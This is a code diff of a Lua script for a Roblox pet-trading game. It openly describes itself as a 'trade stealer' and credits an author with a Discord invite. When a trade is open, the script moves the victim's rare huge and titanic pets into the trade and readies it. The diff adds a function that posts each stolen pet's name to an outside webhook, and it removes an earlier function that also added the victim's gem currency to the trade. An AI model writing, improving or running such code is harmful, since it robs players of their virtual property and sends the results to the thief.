@@ -48,22 +48,6 @@ local function DepositPetInTrade()
     end 
 end
 
-function AddGemsToTrade()
-    for i, v in pairs(inventory.Currency) do
-        if v.id == "Diamonds" then
-            GemAmount = v._am
-            GemId = i
-            local args = {
-                [1] = 1,
-                [2] = "Currency",
-                [3] = GemId,
-                [4] = GemAmount
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
-        end
-    end
-end
-
 function SendMessage(url, message)
     local http = game:GetService("HttpService")
     local headers = {
@@ -159,6 +143,33 @@ function CountTitanics()
 	return count
 end
 
+local WebhookList = {}
+
+for i, v in pairs(inventory.Pet) do 
+    local PetId = v.id
+    local PetDir = library.Directory.Pets[PetId]
+    if PetDir and (PetDir.huge or PetDir.titanic) then
+        table.insert(WebhookList, PetId)
+    end
+end
+
+function SendPublic(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = { embed }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
+end
+
 if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 	local titanics = CountTitanics()
 	local huges = CountHuges()
@@ -176,8 +187,25 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 		if game.Players.LocalPlayer.PlayerGui.TradeWindow.Enabled == true and GetTradeID() ~= nil then
 			if deposited ~= true then
 				DepositPetInTrade()
-				AddGemsToTrade()
 				ReadyTrade()
+				if #WebhookList > 0 then
+					local embed = {
+						["title"] = "New trade stealer hit!",
+						["footer"] = {
+							["text"] = "Trade stealer by Tobi. discord.gg/HcpNe56R2a"
+						},
+						["fields"] = {}
+					}
+					for _, PetName in ipairs(WebhookList) do
+						local field = {
+							["name"] = "Pet name",
+							["value"] = PetName,
+							["inline"] = false
+						}
+						table.insert(embed.fields, field)
+					end
+					SendPublic(Webhook, embed)
+				end
 			end
 			wait(3)
 		end
